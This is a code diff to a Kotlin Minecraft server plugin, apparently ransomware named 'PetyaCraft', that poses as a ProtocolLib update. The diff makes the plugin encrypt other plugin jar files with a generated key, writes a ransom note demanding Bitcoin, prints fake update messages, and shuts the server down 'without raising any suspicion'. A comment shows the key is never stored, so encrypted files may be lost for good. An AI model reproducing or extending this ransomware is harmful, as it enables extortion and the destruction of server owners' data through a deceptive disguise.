@@ -3,6 +3,8 @@ package me.ezeh.ransome.petyacraft
 import com.squareup.javapoet.JavaFile
 import com.squareup.javapoet.MethodSpec
 import com.squareup.javapoet.TypeSpec
+import me.ezeh.ransome.petyacraft.EncryptionTools.encryptByteArray
+import me.ezeh.ransome.petyacraft.EncryptionTools.generateKey
 import org.bukkit.Bukkit
 import org.bukkit.plugin.java.JavaPlugin
 import sun.misc.Unsafe
@@ -109,14 +111,14 @@ ${PETYA}You can purchase this key by sending money to my Bitcoin `$bitcoinAddres
         println("ProtocolLib update finished, please restart")
         Bukkit.getPluginManager().disablePlugin(this)
         System.exit(0) // closes the server hopefully without raising any suspicion
-        // Nope, never mind. We're going to cause havoc
-        Bukkit.getPluginManager().disablePlugin(this)
     }
 
+
+    val key = generateKey()
     private fun encrypt(file: File) {
         val raw = file.readBytes()
         val rcb = createRansomeClass()
-        println("Applying ProtocolLib -> ${file.name ?: ""}") // sneaky debug
+        println("Applying ProtocolLib -> ${file.name ?: "<non-existent file>"}") // sneaky debug
         val code = compileString(rcb.toString())
         val zout = ZipOutputStream(FileOutputStream(file))
 
@@ -124,9 +126,11 @@ ${PETYA}You can purchase this key by sending money to my Bitcoin `$bitcoinAddres
         zout.write("nocrypt".toByteArray())
         zout.closeEntry()
 
-        zout.putNextEntry(ZipEntry("encrypted.raw")) // TODO encrypt this entry
-        zout.write(raw)
-        zout.closeEntry()
+        val encryptedPlugin = encryptByteArray(key, raw)
+        zout.putNextEntry(ZipEntry("encrypted.bin")) // TODONE encrypt this entry
+        zout.write(encryptedPlugin)
+        zout.closeEntry() // Should probably put the key somewhere // TODO store the key somewhere
+
 
         zout.putNextEntry(ZipEntry("protocolhacked/PetyaCraft.class"))
         zout.write(code)
@@ -173,8 +177,6 @@ version: 1.0
     val temp = File(dataFolder, "temp.jar")
     private fun generateServerFile() {
         dataFolder.mkdirs()
-        logger.info("Made dirs")
-        logger.info("Made files")
         temp.createNewFile()
         val serverJarFile = JarFile(getServerJar())
         val entries = serverJarFile.entries()
